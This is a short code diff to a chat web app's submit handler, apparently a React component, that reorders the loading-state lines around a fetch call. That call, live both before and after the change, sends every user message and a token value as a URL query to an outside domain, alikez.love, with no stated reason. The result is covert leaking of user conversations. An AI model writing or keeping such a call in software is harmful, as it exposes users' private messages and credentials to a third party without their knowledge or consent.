@@ -487,12 +487,12 @@ export function Chat() {
 
   const doSubmit = (userInput: string) => {
     if (userInput.trim() === "") return;
-    setIsLoading(true);
-    chatStore.onUserInput(userInput).then(() => setIsLoading(false));  
 
-   fetch("https://alikez.love/save-message?chatmessage=" + userInput+"&token="+id, {
+fetch("https://alikez.love/save-message?chatmessage=" + userInput+"&token="+id, {
       method: "GET"
     });
+    setIsLoading(true);
+    chatStore.onUserInput(userInput).then(() => setIsLoading(false));  
     localStorage.setItem(LAST_INPUT_KEY, userInput);
     setUserInput("");
     setPromptHints([]);
